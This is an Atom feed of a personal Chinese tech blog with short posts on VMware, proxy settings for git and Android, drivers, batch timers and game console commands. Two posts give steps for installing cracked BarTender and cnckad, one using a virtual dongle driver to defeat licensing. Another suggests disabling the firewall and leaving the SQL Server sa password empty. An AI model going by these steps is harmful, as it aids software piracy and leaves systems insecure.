<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>E1sewhere</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://e1sewhere.github.io/"/>
  <updated>2023-02-26T14:17:37.572Z</updated>
  <id>https://e1sewhere.github.io/</id>
  
  <author>
    <name>E1se</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>&#39;虚第一次拟化物理机 FAILED Unable to find the system volume, reconfiguration is not</title>
    <link href="https://e1sewhere.github.io/2023/02/26/%E8%99%9A%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8B%9F%E5%8C%96%E7%89%A9%E7%90%86%E6%9C%BA-FAILED-Unable-to-find-the-system-volume-reconfiguration-is-not/"/>
    <id>https://e1sewhere.github.io/2023/02/26/虚第一次拟化物理机-FAILED-Unable-to-find-the-system-volume-reconfiguration-is-not/</id>
    <published>2023-02-26T14:03:09.000Z</published>
    <updated>2023-02-26T14:17:37.572Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a><br>之前一直用的WTG炸了，实在没有心情再搞一个，没有做好备份实在是后悔。 想起来VMware似乎直接有一个虚拟化物理的功能，遂尝试把本地的win10(x64 190x版本)给虚拟化了。</p><p>使用的VMware vCenter CS 6.x的版本，没有中文，靠着小学的英语水平操作了一波。由于原硬盘很大，我直接把c盘和数据盘选择最小大小。 一个小时后虚拟化完成了，看看task摘要：</p><p>%98 FAILED: Unable to find the system volume, reconfiguration is not possible.<br>失败了 先把已经完成的vmx等文件备份一下,开始Google,网页很少,就几个英文VM的论坛有相关信息,不过题主出的问题似乎和我差不多.靠着谷歌翻译和猜,把能做的操作都做了一遍,不知道原理反正做就是了.</p><p>启动一下,win10检测出启动问题,然后运行自带的修复程序.好了开机成功… 怀着疑问,我把之前没有操作过的虚拟机文件直接启动,win10修复后依然成功开机,也就是说前面一通操作完全没有必要,不得不说win10还是挺nb的.</p><p>开机后显卡驱动有问题,硬盘也搞得太小了.其他都还好,把更新禁止了,应该可以日用.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>管家婆安装&amp;启动</title>
    <link href="https://e1sewhere.github.io/2023/02/26/%E7%AE%A1%E5%AE%B6%E5%A9%86%E5%AE%89%E8%A3%85-%E5%90%AF%E5%8A%A8/"/>
    <id>https://e1sewhere.github.io/2023/02/26/管家婆安装-启动/</id>
    <published>2023-02-26T14:02:44.000Z</published>
    <updated>2023-02-26T14:17:29.382Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a><br>这个是记录管家婆辉煌的安装以及第一次启动过程的文档.</p><p>安装过程<br>安装环境<br>Win10专业版<br>管家婆辉煌<br>关闭防火墙,或者把防火墙的211端口打开.（实际测试不关闭也可以使用，如果不能使用可以尝试关闭防火墙）</p><p>准备工作<br>首先确保已经安装了mysql2000,如果不会安装可以参考:Win10安装 SQL server 2000<br>如果需要安装电子狗驱动程序依然可以参考上面的链接.</p><p>另外需要申明的一点是,为了尽可能避免未知错误,我们所有需要执行的程序都使用管理员执行.</p><p>安装过程<br>直接管理员执行安装程序,如果有批处理脚本可以不使用管理员模式,直接执行脚本.</p><p>安装时选择需要安装的路径,路径随意但最好为全英文.</p><p>安装时会选择安装的产品,按需选择,这里我选择了单机版,其他的如服务段,帮助文件等都安装,只有客户端是需要我们选择的.</p><p>基本无脑下一步.<br>如果需要输入服务器地址,输入127.0.0.1,如果输入密码就输入数据库密码,我的密码设置为空.</p><p>第一次启动<br>安装完成后,我们把三个图标从菜单拖动到桌面:</p><p>TCP/IP端口服务器<br>管家婆辉煌Ⅱ TOP+服务器<br>管家婆辉煌Ⅱ TOP+单机版(这个要看你安装的是什么)<br>然后三个程序都在属性兼容性里勾选以管理员身份运行此程序.</p><p>在保证你的mysql2000正常启动后,首先管理员启动TCP/IP端口服务器,如果需要输入服务器同上.<br>启动后点开TCP/ip端口服务器的托盘,查看端口,正常情况应该是有且仅有211端口被侦听.</p><p>然后管理员权限启动管家婆辉煌II服务器,启动后点开托盘,设置,设置数据库连接参数,保证服务器为127.0.0.1,用户名为sa,密码为你设置的数据库密码,我的密码为空.</p><p>启动管家婆辉煌Ⅱ TOP+单机版,正常情况下应该可以启动了.</p><p>如果不行检查防火墙,以及这三个程序是否正常启动(包括参数):</p><p>TCP/IP端口服务器<br>管家婆辉煌Ⅱ TOP+服务器<br>SQLserver服务管理器<br>参考管家婆官方帮助文档也能解决一些疑难杂症.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>Google Play 无法下载应用</title>
    <link href="https://e1sewhere.github.io/2023/02/26/Google-Play-%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E5%BA%94%E7%94%A8/"/>
    <id>https://e1sewhere.github.io/2023/02/26/Google-Play-无法下载应用/</id>
    <published>2023-02-26T14:02:02.000Z</published>
    <updated>2023-02-26T14:16:54.531Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a></p><p>自从换了miui官方系统,google play就时不时无法下载了.<br>首先,排除干扰因素,确保能够进入google play主页,开启数据下载开关,然后下载一直转圈.<br>分下一下原因,再找出解决办法.</p><p>分析<br>先直接开启全,.局代,.理.确保所有流量都向服务器发出.<br>我有两批节点,一批在服务器审计处限制了.cn等域名的代,.理,暂且称之为A组.另一批没有做任何限制,可以代,.理绝大多数.cn域名称之为B组.<br>所以猜测google play无法下载是因为发出的请求使用了.cn的域名<br>抓取google play的日志发现这两个地址</p><p>googleapis.cn<br>services.googleapis.cn<br>并不是正常的</p><p>googleapis.com<br>解析一下ip,ip地址,并查询ip归属.<br>归属地为北京,北京谷翔信息技术有限公司,应该是持有google中国icp拍照的公司,但是这个ip并不能获取任何play商店的内容.天眼查显示该公司google持股50%.大概不是什么钓鱼地址.手机没有解锁,所以我就不考虑重刷框架了.</p><p>所以大致知道了googplay时不时不能下载的原。节点的路由规则很简单,且切换策略使用的url-test当节点切换到B组的时候,googleapis.cn会被代,.理服务器解析到play市场正确的ip.而当使用A组的时候会被服务器拒绝解析.或者当你使用了一些不恰当的规则让googleapis.cn不走代,.理服务器,直接国内dns解析到了这个谷翔公司的ip.</p><p>所以我们要下载就需要满足两个条件:</p><p>代,.理服务器没有把这两个域名加入审计<br>这两个域名通过代,.理访问<br>那些使用国内版固件又能下载的老哥一定是满足了这两个条件.</p><p>解决方案<br>更换代,.理<br>找一个能够回国的节点用,比如我就在规则中把这两个.cn的地址分配给B组.</p><p>刷机<br>群里发生这个问题的是国内固件,所以可以刷一个其他的固件,或者重装原版Google服务.</p><p>adb删除不正确的地址<br>可以用adb删除googlexxx.cn的xml文件.但是手机升级后肯定需要重新搞.</p><p>更改dns(没试过)<br>直接使用国外的dns服务应该可以解决,因为我们只需要获取正确的ip,但是这样会导致国内服务缓慢.</p><p>其他<br>还有什么关闭下载加速,清空数据的玄学艹作,这种一般都是没有把需要代理应用勾选完,或者节点质量差的原因.</p><p>结论<br>ROOT后方法就太多了，由于没有root,所以最好的还是找一个可以回国的节点,然后在规则中将</p><p>googleapis.cn<br>services.googleapis.cn<br>加入B组<br>除此之外,由于A组的流量多,是我的主要节点,B组是自己搭建的,落地服务器质量差,延迟奇高只是做备用的.<br>所以,我还需要把类似</p><p>translate.google.cn<br>的域名加入B组规则.<br>百度某些api有地域歧视,我也把他们加入了B组,使用美,.帝的ip来访问.<br>台,.湾无法使用百度网盘(A组有tai,.弯节点),也得使用B组.<br>加了一大堆规则,头疼.所以建议使用clas,.h的老哥们还是用subconvert来拼接规则方便一点.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>VMware虚拟机设置选项</title>
    <link href="https://e1sewhere.github.io/2023/02/26/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AE%E9%80%89%E9%A1%B9/"/>
    <id>https://e1sewhere.github.io/2023/02/26/VMware虚拟机设置选项/</id>
    <published>2023-02-26T14:00:58.000Z</published>
    <updated>2023-02-26T14:17:04.235Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a><br>设置VMware的CPU的时候不知道该怎么设置，于是搜索了一下</p><p>处理器<br>处理器内核总数要小于实际物理CPU的逻辑处理器总数</p><p>逻辑处理器可以在任务管理器看到</p><p>处理器内核总数=处理器数量x每个处理器的内核数量</p><p>我的理解，处理器数量和每个处理器内核数量和实际处理器没关系，是虚拟化出来的。</p><p>所以只要这两个相乘小于物理CPU的逻辑处理器数量就行，我的AMD 6核心，对应12线程，所以猜想出这几种组合</p><p>处理器数量    每个处理器的内核数量<br>1                     12    √<br>12                   1    X<br>2                     6    √<br>1                     6    √<br>其中12处理器数量不行，两个却可以，我猜想处理器数量的最大值应该是由主板插槽之类的决定的，反正这个主机处理器数量不能大于2。</p><p>同时AMD需要在bios中开启AMD-V</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>Bartender安装基础使用及使用数据库字段循环递增</title>
    <link href="https://e1sewhere.github.io/2023/02/26/Bartender%E5%AE%89%E8%A3%85%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%97%E6%AE%B5%E5%BE%AA%E7%8E%AF%E9%80%92%E5%A2%9E/"/>
    <id>https://e1sewhere.github.io/2023/02/26/Bartender安装基础使用及使用数据库字段循环递增/</id>
    <published>2023-02-26T13:59:43.000Z</published>
    <updated>2023-02-26T14:16:18.074Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a></p><p>第一次使用标签打印机，得力送的Bartender lite版本，无法链接数据库，遂下载官方2016版本，特殊地区无法连接到官方服务器，安装失败，直接使用完整版本的2019 r5安装包，打个补丁，没办法只能用了。只做测试学习使用，以后真要大量用再补票吧。</p><p>安装<br>在某外网搜索关键字，找到2019 R5版本，和补丁。执行安装程序后会有很大的延迟时间才弹出窗口，不知道是不是虚拟机的原因。无脑安装完整版，注册补丁解压到Bt的安装根目录，执行补丁程序（日常管理员权限执行），点击补丁窗口中间的一排蓝字。</p><p>安装完成</p><p>连接打印机<br>打印机注意事项<br>DL-888t支持最大碳带宽度为110mm，最小为33.8mm，长度为90m，碳带卷芯内径为12.7mm，碳带为双轴，纸张最大也是110mm<br>定位块（黑色的滑块），要对准边缘的三角形标记<br>打印机首选项-》页面设置-》新建-》名称改为数字（不能为中文），标签大小按照实际标签设置。<br>配套的打印机设置工具中要添加打印机（不能使用默认的Auto），设置打印机按钮选项卡需要吧模式选择为对应的打印模式，热敏模式必须把碳带取出。<br>BT连接注意<br>bt打印中纸张也要选择实际大小否则可能会连续出纸</p><p>BT连接数据库（excel）<br>简单，网上大把教程，且根据日常操作逻辑就可以成功连接excel，唯一值得注意的是，需要使用office 2006之后版本创建的xls文件。</p><p>使用数据库字段循环递增<br>BT模板使用数据库中的字段已经很简单了，但是实现这个递增还是挺难的（对我来说），我尝试使用Bt支持的vb来实现，但是功底太差实现不了，唯一能想出的解决办法，就是使用脚本直接把表格数据序列化，然后直接使用数据库中的字段。但是这太傻了。</p><p>最后在群里大佬花了几分钟给解决了。请大佬喝杯咖啡，然后把模板文件拿来研究。</p><p>由于使用的非官方BT，大佬的模板过来直接连接不了数据库，尝试安装了AccessDatabaseEngine_X64.exe就成功打开了。</p><p>需求<br>要实现如图的把数量，按照数量的份数打印，然后每一份按照编号递增</p><p>img</p><p>456</p><p>实现<br>不需要使用VB，直接使用软件原生的序列化即可实现。</p><p>把文本的属性直接如下设置：</p><p>IMG_20200530_172006</p><p>IMG_20200530_172014</p><p>IMG_20200530_172021</p><p>IMG_20200530_172028</p><p>治疗颈椎病从我做起</p><p>大致的逻辑过程就是：序列号是一个队列，队列打印完了，一行数据就循环完毕，开始第二行，序号改变，数据重置为1，开始循环打印第二行。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>Win10中Git代理设置（包括ssh） </title>
    <link href="https://e1sewhere.github.io/2023/02/26/Win10%E4%B8%ADGit%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%EF%BC%88%E5%8C%85%E6%8B%ACssh%EF%BC%89/"/>
    <id>https://e1sewhere.github.io/2023/02/26/Win10中Git代理设置（包括ssh）/</id>
    <published>2023-02-26T13:58:33.000Z</published>
    <updated>2023-02-26T14:17:20.147Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a><br>Hexo使用的时候，Git中代理设置总是失败，才想起来配置的是http实际协议是ssh，所以一直都用http登录github，虽然可以用带参数的脚本命令，但确实没有ssh用着舒服。所以把Git的代理配置研究记录一下。</p><p>http/socks配置<br>http配置<br>http，包含了https所以无需单独配置https，注意自己代理监听的地址和端口必须一致</p><p>git config –global http.proxy <a href="http://127.0.0.1:1080" target="_blank" rel="noopener">http://127.0.0.1:1080</a><br>socks<br>一般使用这两种</p><p>git config –global http.proxy socks5://127.0.0.1:1080<br>git config –global http.proxy socks5h://127.0.0.1:1080<br>第二种据说要好一点。</p><p>ssh配置<br>来源：<a href="https://segmentfault.com/a/1190000021998129" target="_blank" rel="noopener">https://segmentfault.com/a/1190000021998129</a></p><p>在ssh配置文件：~/.ssh/config（不存在就手动创建）</p><p>增加如下内容</p><p>Host github.com *.github.com<br>User git</p><pre><code># SSH默认端口22， HTTPS默认端口443Port 22Hostname %h# 这里放你的SSH私钥IdentityFile ~\.ssh\id_rsa# 设置代理, 127.0.0.1:10808 换成你自己代理软件监听的本地地址# HTTPS使用-H，SOCKS使用-SProxyCommand connect -S 127.0.0.1:1080 %h %p</code></pre><p>这里命令使用了connect中继，所以需要安装：connect</p><p>win10中把下载的connect解压，然后把connect.exe所在目录添加至环境变量的Path变量中即可</p><p>补充一下git使用代理后可能会 kex_exchange_identification: Connection closed by remote host<br>所以最好还是改github的hosts</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>Win10 安装cnckad16</title>
    <link href="https://e1sewhere.github.io/2023/02/26/Win10-%E5%AE%89%E8%A3%85cnckad16/"/>
    <id>https://e1sewhere.github.io/2023/02/26/Win10-安装cnckad16/</id>
    <published>2023-02-26T13:57:56.000Z</published>
    <updated>2023-02-26T14:17:14.967Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a><br>cnckad 安装包是从同事那里搞来的破解包，实在不好意思问他怎么安装安装摸索了半个小时，网上没找到适用win10的教程。最后也算是安好了</p><p>环境<br>win10，已经安装好常见的运行环境（3dm游戏包）</p><p>安装步骤<br>安装步骤可能有冗余，反正最后安装好了，也不用去研究哪些操作是不必要的。</p><p>安装软件主体<br>直接运行cnckadCD.exe,操作都是下一步下一步，这部分过程可以搜索“cncKad16安装步骤”，有详细的安装步骤。</p><p>替换破解文件<br>这里参考安装包里的说明即可，主要步骤就是复制对应文件到安装路径的根目录</p><p>注册表<br>打开目录MulKLE_x64运行cncKad16_x64.reg</p><p>安装虚拟驱动<br>安装驱动好后在设备管理器中可以看到，虚拟驱动有三个，所以必须有这三个才不会弹出key的错误对话框Snipaste_2020-10-25_22-25-32</p><p>打开目录MulKLE_x64将内容直接复制到安装cnckad的根目录。</p><p>设置devcon.exe的兼容性为win7，勾选管理员身份运行此程序</p><p>运行install.cmd。</p><p>如果运行没有反应。可以手动输入命令：</p><p>当前目录shift右键打开powershell<br>输入命令<br>.\remove root\MulKLE<br>.\devcon install MulKLE.inf root\MulKLE<br>弹出安装驱动窗口，确定<br>安装完毕</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>Surface Book全屏降低分辨率</title>
    <link href="https://e1sewhere.github.io/2023/02/26/Surface-Book%E5%85%A8%E5%B1%8F%E9%99%8D%E4%BD%8E%E5%88%86%E8%BE%A8%E7%8E%87/"/>
    <id>https://e1sewhere.github.io/2023/02/26/Surface-Book全屏降低分辨率/</id>
    <published>2023-02-26T13:57:08.000Z</published>
    <updated>2023-02-26T14:16:59.227Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a></p><p>本文记录了如何降低surface分辨率并让其全屏</p><p>需求原因<br>surface 设置中自带的分辨率选项除了默认的最大分辨率，其他分辨率都没有3：2的比例，这就导致了其他所有分辨率均无法全屏。</p><p>降低分辨率的目的是提升续航，提升续航大最有效的方法大致有这几个：</p><p>更改电源策略为省电<br>降低屏幕亮度<br>通过软件调整cpu电压<br>降低显示器分辨率<br>其中最有效的为电源策略和屏幕亮度。cpu电压调整由于个人能力原因一直会导致其他问题，或者调整后省电感知不强，如果有朋友知道该怎么弄欢迎留言指导。降低显示器分辨率能提升续航，但也不是很大，不过在运行某些软件时降低分辨率可以使软件更流畅。</p><p>降低分辨率网上有两个思路，一个是修改注册表，对注册表不了解，所以这个操作搞不来。虽然网上有现成修改好的注册表，但使用后并没有作用。</p><p>另一个思路是直接使用intel官方驱动代替surface的定制显卡驱动，官方驱动有自定义分辨率功能，但surface不支持直接安装包安装Intel显卡驱动，遂需要手动安装。</p><p>安装过程<br>首先确认自己的cpu型号，我的cpu为i5-6300k,在intel官网中分类为i5 6代</p><p>然后在设备管理器 -显示适配器中查看目前驱动型号，我的型号为intelR HD graphics 520</p><p>拥有这两个信息后就可以找到自己cpu对应的intel官方驱动了</p><p>直接去intel驱动官网：<a href="https://www.intel.cn/content/www/cn/zh/support/products/80939/graphics.html" target="_blank" rel="noopener">https://www.intel.cn/content/www/cn/zh/support/products/80939/graphics.html</a></p><p>我的cpu就是，适用于第 6 代英特尔® 处理器的显卡-英特尔核芯显卡520</p><p>点开后会有适用本cpu的所有驱动，选择一个适合的（说明中会有适用描述，正常情况应该所有驱动都可以，随便选一个就好）</p><p>我选择的是适用于 Windows * 的英特尔® Graphics Driver [15.45]</p><p>下载win64前缀，zip后缀的压缩包，不要下载exe文件，exe文件是无法安装的。</p><p>我下载的是：win64_15.45.33.5164.zip</p><p>下载后解压</p><p>然后回到设备管理器 -显示适配器对着显卡驱动右键-属性，选择驱动程序选项卡，点击更新驱动程序，选择浏览我的电脑以查找驱动程序，点击让我从计算机上的可用驱动程序列表中选取选择从磁盘安装然后选择解压目录中的igdlh64.inf文件,通常该文件在Graphics文件夹中。后续就是下一步下一步了。安装后重启。</p><p>重启后可在显卡自定义中设置分辨率，只要分辨率为3：2即可。</p><p>我常用的为：</p><p>1080：720<br>1920：1280<br>900：600<br>自定义分辨率其他的参数：刷新率为60.其他的不要动。</p><p>自定义分辨率设置完成后就可以在系统的显示设置中随时更改分辨率啦。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows休眠倒计时用bat实现</title>
    <link href="https://e1sewhere.github.io/2023/02/26/Windows%E4%BC%91%E7%9C%A0%E5%80%92%E8%AE%A1%E6%97%B6%E7%94%A8bat%E5%AE%9E%E7%8E%B0/"/>
    <id>https://e1sewhere.github.io/2023/02/26/Windows休眠倒计时用bat实现/</id>
    <published>2023-02-26T13:56:22.000Z</published>
    <updated>2023-02-26T14:17:23.532Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a><br>有休眠需求，本来以为和shutdown一样直接简单命令就行了，可是要调用可执行程序，命令有点长干脆写个bat算了，bat命令如下：</p><p>title 定时休眠<br>@ECHO OFF&amp;SETLOCAL ENABLEDELAYEDEXPANSION<br>SET /p t=请输入休眠时间（单位秒,只输入数字）：<br>SET /a s=t+1<br>FOR /l %%i in (1,1,!s!) do (<br>    SET /a s-=1<br>    ping -n 2 127.1&gt;nul<br>    title 休眠倒计时： !s! 需要终止请直接关闭控制台<br>)</p><p>START “” rundll32.exe powrprof.dll,SetSuspendState 0,1,0<br>直接cmd里执行或者创建一个bat后缀文件复制上述内容即可。其中有中文回显注意编码否则会乱码。<br>既然写了那也付一个关机倒计时吧，同理可得</p><p>title 定时关机<br>@ECHO OFF&amp;SETLOCAL ENABLEDELAYEDEXPANSION<br>SET /p t=请输入关机时间（单位秒,只输入数字）：<br>SET /a s=t+1<br>FOR /l %%i in (1,1,!s!) do (<br>    SET /a s-=1<br>    ping -n 2 127.1&gt;nul<br>    title 关机倒计时： !s! 需要终止请直接关闭控制台<br>)<br>shutdown -s -t 1</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>上古卷轴5卡任务使用控制台强制完成</title>
    <link href="https://e1sewhere.github.io/2023/02/26/%E4%B8%8A%E5%8F%A4%E5%8D%B7%E8%BD%B45%E5%8D%A1%E4%BB%BB%E5%8A%A1%E4%BD%BF%E7%94%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%BA%E5%88%B6%E5%AE%8C%E6%88%90/"/>
    <id>https://e1sewhere.github.io/2023/02/26/上古卷轴5卡任务使用控制台强制完成/</id>
    <published>2023-02-26T13:55:03.000Z</published>
    <updated>2023-02-26T14:17:33.641Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>无格式迁移<br><a id="more"></a><br>网上搜了一圈全是复制粘贴的一个方式，由于使用了整合MOD整合了很多任务包，sqt这种获取原版任务的命令没用。害得去外网。<br>方法如下：<br>首先~进入控制台，输入如下命令并回车</p><p>save funclist 1<br>之后会弹出一个txt文档，如果没有弹出，到盘符:\Documents\My Games\Skyrim Special Edition\saves里或者是盘符:\Documents\My Games\Skyrim\saves里不出意外里面会有一个文档funclist.ess.txt<br>如果使用了MO管理器则会在MO的类型…\profiles...\saves\目录下，建议还是直接用everything之类的索引搜索软件直接搜索文件名称funclist.ess.txt<br>使用记事本打开此文件可以看到形如如下内容</p><p>  FE012800  5930/5930  14000002  78 PyP_Legendary                           - Quest Flags(2)           Quest Already Run(1)     Quest Runtime Data(5914)<br>  1A07A334   814/814   BC000002  78 人生如梦                            - Quest Flags(2)           Quest Already Run(1)     Quest Instance Data(14)  Quest Runtime Data(618)  Quest Objectives(9)      Quest Stages(157)<br>  0B0CE0F1   662/662   9C000002  78 被缚的风暴斗篷                   - Quest Flags(2)           Quest Already Run(1)     Quest Instance Data(28)  Quest Runtime Data(449)  Quest Stages(169)<br>首列的就是任务代码，如果没有看到如此结构的内容，直接文本内ctrfl+F搜索你卡关的任务名称，譬如我的是人生如梦，定位到任务处，注意该行一定要有quest字样才是任务行，否则可能是其他同名称的对象，比如某个物品名称代号也叫人生如梦。<br>人生如梦的任务代码为1A07A334,记录下来。<br>人后回到游戏，进入控制台，输入sqs 1A07A334查询任务阶段<br>控制台回显如下：</p><p>Stage 1:1<br>Stage 2:1<br>Stage 10:0<br>…<br>冒号候的1代表已经完成，0代表未完成，冒号前的代表任务阶段，数字递增但不一定是以1自然递增，有可能是100，200也肯是10，20等等。<br>我是第三个未完成所以输入如下命令</p><p>setstage 1A07A334 10<br>关掉控制台，任务就已经完成了。此方法适用部分卡关任务，运气好就过了，运气不好重开，重装吧。</p><p>注意：</p><p>任务按阶段进行，不要跳过中间状态<br>任务最好把行为作完避免后面bug率提高，比如要kill某怪物，最好把怪物先killed了<br>大小写我不知道有没有影响，最好保持一致吧<br>completequest 1A07A334 为强制结束该任务，可以试试</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>DWG文件输出为高质量图片</title>
    <link href="https://e1sewhere.github.io/2023/02/26/DWG%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA%E4%B8%BA%E9%AB%98%E8%B4%A8%E9%87%8F%E5%9B%BE%E7%89%87/"/>
    <id>https://e1sewhere.github.io/2023/02/26/DWG文件输出为高质量图片/</id>
    <published>2023-02-26T13:50:54.000Z</published>
    <updated>2023-02-26T14:16:25.952Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>原帖：<a href="https://www.cnblogs.com/e1sewhere/p/16721246.html" target="_blank" rel="noopener">https://www.cnblogs.com/e1sewhere/p/16721246.html</a><br>无格式迁移<br><a id="more"></a></p><p>法一：直接使用autocad自带输出<br>手头有个dwg文件里的图要用来打印大尺寸图片，直接使用autocad2022自带的打印为png/jpg格式，把图片输出尺寸设置为实际打印尺寸，dpi自定义最大（200，再大就提示不支持），输出的图片质量还是不清楚，打印后很模糊。<br>不过如果不是用来打印这种大尺寸图片应该是够用了。具体输出方法网上可以搜索到</p><p>法二：使用格式转换工具转换<br>目前网上找到的无论是在线还是本地付费软件都是辣鸡，不行，还不如cad自带的输出。试了几个相对好用的有，讯捷CAD转换器。质量马马虎虎不太能达到我的要求，但其他用法应该还是可以用的。</p><p>法三：导出为eps文件再使用ps<br>直接autocad输出为eps文件，然后使用ps打开<br>理论上可行，图片也挺清楚，但是不知道为啥，图片ps打开后文件内容和以前不一样了</p><p>方法四：导出为pdf再使用ps打开<br>综合下来我最后使用了这个方法，但依然不太好用，其实最好的办法其实就是，如果会用ps之类的绘图软件的话直接照着cad的内容在ps里重绘还好点<br>使用cad导出为pdf可以支持dpi几乎无限大了，但是dpi设置太大了会输很久很久，所以我dpi设置的400</p><p>过程如下：</p><p>autocad 打印为pdf，质量控制有 pdf选项、着色视口选项、图纸尺寸，在允许的情况下尽可能高</p><p>其中特性用以自定义图纸尺寸<br><a href="https://img2022.cnblogs.com/blog/1443724/202209/1443724-20220922234148543-1751556300.png" target="_blank" rel="noopener">https://img2022.cnblogs.com/blog/1443724/202209/1443724-20220922234148543-1751556300.png</a></p><p>使用ps打开pdf，栅格化文件的时候也是把质量都弄高</p><p>ps打开pdf后不知道为啥图片颜色部分全部有了细小的横线，在ps里稍微修改下把所有色块修改为纯色</p><p>ps导出为图片格式</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原帖：&lt;a href=&quot;https://www.cnblogs.com/e1sewhere/p/16721246.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/e1sewhere/p/16721246.html&lt;/a&gt;&lt;br&gt;无格式迁移&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>VM虚拟机使用主机（物理机）代理</title>
    <link href="https://e1sewhere.github.io/2023/02/26/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%89%A9%E7%90%86%E6%9C%BA%EF%BC%89%E4%BB%A3%E7%90%86/"/>
    <id>https://e1sewhere.github.io/2023/02/26/VM虚拟机使用主机（物理机）代理/</id>
    <published>2023-02-26T11:16:23.000Z</published>
    <updated>2023-02-26T11:21:32.345Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>由于Hexo在虚拟机里，同步时有时候需要代理。但懒得另外代理了，所以直接用物理机代理。<br><a id="more"></a></p><p>Vm软件中网络适配器设置为桥接模式，并勾选复制物理网络链接状态。<br>然后虚拟机（windows）中设置代理监听物理机地址，物理机地址ip用ipcong查询ipv4地址就是。同时物理机的clash开启Allow lan,端口用clash内的配置端口。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于Hexo在虚拟机里，同步时有时候需要代理。但懒得另外代理了，所以直接用物理机代理。&lt;br&gt;
    
    </summary>
    
      <category term="默认" scheme="https://e1sewhere.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>Win10安装 SQL server 2000</title>
    <link href="https://e1sewhere.github.io/2019/06/27/Win10%E5%AE%89%E8%A3%85-SQL-server-2000/"/>
